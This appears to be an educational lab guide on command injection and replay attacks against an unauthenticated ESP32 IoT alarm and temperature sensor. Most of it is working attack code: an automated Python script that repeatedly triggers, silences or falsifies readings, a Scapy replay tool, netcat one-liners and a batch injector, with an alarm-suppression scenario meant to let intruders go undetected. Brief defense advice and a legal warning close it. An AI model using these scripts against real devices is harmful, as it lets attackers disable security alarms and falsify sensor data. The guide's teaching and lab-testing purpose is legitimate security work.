# Command Injection Attack Examples

## 🎯 Overview

Once you've identified the protocol through MITM analysis, you can directly inject commands to manipulate the IoT system.

---

## 🔧 Method 1: Using Reply.py (Recommended)

### Basic Usage

```bash
# Configure target
nano Reply.py
# Set TARGET_IP = "192.168.0.103"

# Run tool
python3 Reply.py
```

### Interactive Menu

```
==================================================
  ESP32 IoT Sensor Attack Tool
==================================================

[!] Target Configuration:
    IP: 192.168.0.103
    Port: 80

Available Attacks:
  1. Trigger Alarm
  2. Silence Alarm
  3. Fake Temperature (TEMP>50)
  4. Custom Command
  5. Exit

[>] Select attack (1-5):
```

---

## 💉 Attack Scenarios

### Scenario 1: False Alarm Attack

**Objective:** Trigger alarm without legitimate sensor activation

**Steps:**
1. Run Reply.py
2. Select option `1`
3. Observe buzzer activation

**Command Sent:**
```
ALARM\n
```

**Impact:**
- False security alert
- User distraction
- Alarm fatigue
- Resource waste

**Real-world Analogy:**
Similar to pulling a fire alarm when there's no fire

---

### Scenario 2: Alarm Suppression Attack

**Objective:** Prevent legitimate alarms from sounding

**Context:** 
- Motion detected by ultrasonic sensor
- Sensor sends ALARM command
- Attacker intercepts and sends CLEAR

**Steps:**
1. Wait for legitimate motion detection
2. Immediately run Reply.py
3. Select option `2` (CLEAR)

**Command Sent:**
```
CLEAR\n
```

**Impact:**
- ⚠️ CRITICAL: Real security breach goes undetected
- Intruder enters without alert
- Complete bypass of security system

**Timeline:**
```
T+0s:  Real motion detected
T+1s:  Sensor sends ALARM command
T+1.5s: Buzzer starts sounding
T+2s:  Attacker sends CLEAR command
T+2.5s: Buzzer silences
T+3s:  System believes threat is cleared
```

---

### Scenario 3: Data Manipulation Attack

**Objective:** Send false sensor readings

**Use Case:** Trigger high-temperature alert

**Steps:**
1. Run Reply.py
2. Select option `3`
3. Enter temperature: `95`

**Command Sent:**
```
TEMP:95\n
```

**Impact:**
- False environmental readings
- Unnecessary system responses
- User confusion
- Potential automation triggers

**Advanced Variation:**
```bash
# Send gradually increasing fake temperatures
python3 automated_temp_attack.py
```

---

## 🤖 Method 2: Automated Attack Script

### Create `automated_attack.py`

```python
#!/usr/bin/env python3
"""
Automated Command Injection
Continuously disrupts IoT sensor system
"""

import socket
import time
import random
import sys

TARGET_IP = "192.168.0.103"
TARGET_PORT = 80
ATTACK_INTERVAL = 5  # seconds between attacks

def send_command(cmd):
    """Send command via TCP socket"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((TARGET_IP, TARGET_PORT))
        s.sendall((cmd + "\n").encode())
        response = s.recv(1024).decode().strip()
        s.close()
        return response
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def random_attack():
    """Execute random attack"""
    attacks = [
        ('ALARM', 'False alarm triggered'),
        ('CLEAR', 'Alarm suppressed'),
        (f'TEMP:{random.randint(50, 100)}', 'Fake temperature sent')
    ]
    
    cmd, description = random.choice(attacks)
    print(f"[*] {description}")
    response = send_command(cmd)
    
    if response:
        print(f"[+] Response: {response}")
    else:
        print(f"[-] No response")

def main():
    print("=" * 60)
    print("  AUTOMATED IOT ATTACK")
    print("=" * 60)
    print(f"\n[!] Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"[!] Interval: {ATTACK_INTERVAL} seconds")
    print("[!] Press Ctrl+C to stop\n")
    
    attack_count = 0
    
    try:
        while True:
            attack_count += 1
            print(f"\n--- Attack #{attack_count} ---")
            random_attack()
            time.sleep(ATTACK_INTERVAL)
            
    except KeyboardInterrupt:
        print(f"\n\n[*] Stopped after {attack_count} attacks")
        sys.exit(0)

if __name__ == "__main__":
    main()
```

### Usage

```bash
python3 automated_attack.py
```

**Output:**
```
============================================================
  AUTOMATED IOT ATTACK
============================================================

[!] Target: 192.168.0.103:80
[!] Interval: 5 seconds
[!] Press Ctrl+C to stop

--- Attack #1 ---
[*] False alarm triggered
[+] Response: Alarm triggered

--- Attack #2 ---
[*] Fake temperature sent
[+] Response: Temperature updated: 73

--- Attack #3 ---
[*] Alarm suppressed
[+] Response: Alarm cleared
```

---

## 🔁 Method 3: Replay Attack

### Concept

Capture legitimate traffic and replay it later

### Using tcpdump

```bash
# Capture legitimate traffic
sudo tcpdump -i wlan1 -w capture.pcap 'tcp port 80 and host 192.168.0.101'

# Wait for sensor to send commands
# Press Ctrl+C after capturing

# Extract commands using tshark
tshark -r capture.pcap -T fields -e tcp.payload | xxd -r -p

# Replay manually
echo "ALARM" | nc 192.168.0.103 80
```

---

### Using Scapy (Advanced)

```python
#!/usr/bin/env python3
"""
Replay Attack using Scapy
Extracts and replays commands from PCAP
"""

from scapy.all import *
import socket
import time

def extract_commands(pcap_file):
    """Extract TCP commands from capture file"""
    print(f"[*] Analyzing {pcap_file}...")
    
    packets = rdpcap(pcap_file)
    commands = []
    
    for pkt in packets:
        if TCP in pkt and Raw in pkt:
            if pkt[TCP].dport == 80:  # Commands to buzzer
                try:
                    payload = pkt[Raw].load.decode('utf-8')
                    if payload.strip():
                        commands.append(payload.strip())
                        print(f"[+] Found: {payload.strip()}")
                except:
                    pass
    
    return list(set(commands))  # Remove duplicates

def replay_command(cmd, target_ip, target_port):
    """Replay a command"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target_ip, target_port))
        s.sendall((cmd + "\n").encode())
        response = s.recv(1024).decode().strip()
        s.close()
        print(f"[+] Response: {response}")
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    pcap_file = "capture.pcap"
    target_ip = "192.168.0.103"
    target_port = 80
    
    # Extract commands
    commands = extract_commands(pcap_file)
    print(f"\n[*] Extracted {len(commands)} unique commands\n")
    
    # Replay each command
    for i, cmd in enumerate(commands, 1):
        print(f"[*] Replaying command {i}/{len(commands)}: {cmd}")
        replay_command(cmd, target_ip, target_port)
        time.sleep(1)
    
    print("\n[*] Replay complete")

if __name__ == "__main__":
    main()
```

### Usage

```bash
# First, capture traffic using Wireshark or tcpdump
sudo tcpdump -i wlan1 -w capture.pcap 'tcp port 80'

# Then replay
python3 replay_attack.py
```

---

## 🎯 Method 4: Netcat One-liners

### Quick Command Injection

```bash
# Trigger alarm
echo "ALARM" | nc 192.168.0.103 80

# Clear alarm
echo "CLEAR" | nc 192.168.0.103 80

# Send fake temperature
echo "TEMP:85" | nc 192.168.0.103 80

# Send multiple commands in sequence
(echo "ALARM"; sleep 2; echo "CLEAR"; sleep 2; echo "TEMP:99") | nc 192.168.0.103 80
```

---

### Bash Script for Rapid Testing

```bash
#!/bin/bash
# quick_test.sh - Fast command injection tester

TARGET="192.168.0.103"
PORT="80"

function send_cmd() {
    echo "[*] Sending: $1"
    echo "$1" | nc $TARGET $PORT
    echo ""
}

# Test all commands
send_cmd "ALARM"
sleep 2
send_cmd "CLEAR"
sleep 2
send_cmd "TEMP:77"
```

---

## 🔬 Method 5: Custom Python Socket Script

### Advanced Injection Tool

```python
#!/usr/bin/env python3
"""
Advanced Command Injection Tool
Supports batch commands and custom payloads
"""

import socket
import sys
import time

class IoTInjector:
    def __init__(self, target_ip, target_port=80, timeout=2):
        self.target_ip = target_ip
        self.target_port = target_port
        self.timeout = timeout
        self.commands_sent = 0
        self.responses = []
    
    def send(self, command):
        """Send a single command"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, self.target_port))
            s.sendall((command + "\n").encode())
            
            response = s.recv(1024).decode().strip()
            s.close()
            
            self.commands_sent += 1
            self.responses.append(response)
            
            return response
        except Exception as e:
            return f"Error: {e}"
    
    def batch_send(self, commands, delay=0):
        """Send multiple commands"""
        results = []
        for cmd in commands:
            print(f"[*] Sending: {cmd}")
            response = self.send(cmd)
            print(f"[+] Response: {response}")
            results.append((cmd, response))
            
            if delay > 0:
                time.sleep(delay)
        
        return results
    
    def stats(self):
        """Display statistics"""
        print("\n" + "="*50)
        print("STATISTICS")
        print("="*50)
        print(f"Commands sent: {self.commands_sent}")
        print(f"Unique responses: {len(set(self.responses))}")

# Usage example
if __name__ == "__main__":
    injector = IoTInjector("192.168.0.103")
    
    # Send batch of commands
    commands = [
        "ALARM",
        "TEMP:85",
        "CLEAR",
        "TEMP:30"
    ]
    
    print("[*] Starting batch injection...")
    injector.batch_send(commands, delay=1)
    injector.stats()
```

---

## 📊 Impact Assessment

### Attack Success Metrics

| Metric | Measurement |
|--------|-------------|
| Response Time | < 2 seconds |
| Success Rate | 100% (no auth) |
| Detection Risk | Low (normal traffic) |
| System Impact | High (full control) |

---

### Business Impact

**Security System:**
- ❌ False alarms → User ignores real threats
- ❌ Suppressed alarms → Intruders undetected
- ❌ Data manipulation → Wrong decisions

**Cost Impact:**
- Investigation of false alarms
- Potential security breaches
- System replacement
- Reputation damage

---

## 🛡️ Defense Recommendations

### For Developers

```arduino
// Implement authentication
const char* API_KEY = "secure-random-key-here";

void processCommand(String cmd, String key) {
    // Verify API key
    if (key != API_KEY) {
        Serial.println("Unauthorized");
        return;
    }
    
    // Process command
    if (cmd == "ALARM") {
        triggerAlarm();
    }
}
```

### For Network Administrators

```bash
# Implement firewall rules
iptables -A INPUT -p tcp --dport 80 -s 192.168.0.101 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j DROP
```

### For Users

1. ✅ Update device firmware regularly
2. ✅ Use network segmentation (VLANs)
3. ✅ Monitor for unauthorized connections
4. ✅ Enable logging and alerts
5. ✅ Use encrypted protocols (HTTPS/MQTT over TLS)

---

## ⚠️ Legal Warning

**These techniques are for:**
- ✅ Testing your own devices
- ✅ Authorized penetration tests
- ✅ Educational demonstrations
- ✅ Security research

**NOT for:**
- ❌ Unauthorized access
- ❌ Malicious disruption
- ❌ Data theft
- ❌ Any illegal activity

**Legal consequences include:**
- Criminal prosecution
- Heavy fines
- Imprisonment
- Civil liability

---

## 🎓 Key Takeaways

1. **Cleartext protocols are trivially exploitable**
2. **Authentication is essential, not optional**
3. **Network segmentation limits attack surface**
4. **Encryption prevents eavesdropping**
5. **Defense in depth is necessary**

---

**Next Steps:**
- Learn about [MITM setup](mitm-setup.md)
- Explore [Denial of Service attacks](denial-of-service.md)
- Study [Protocol analysis](protocol-analysis.md)

---

*Use these techniques responsibly to improve IoT security.* 🔐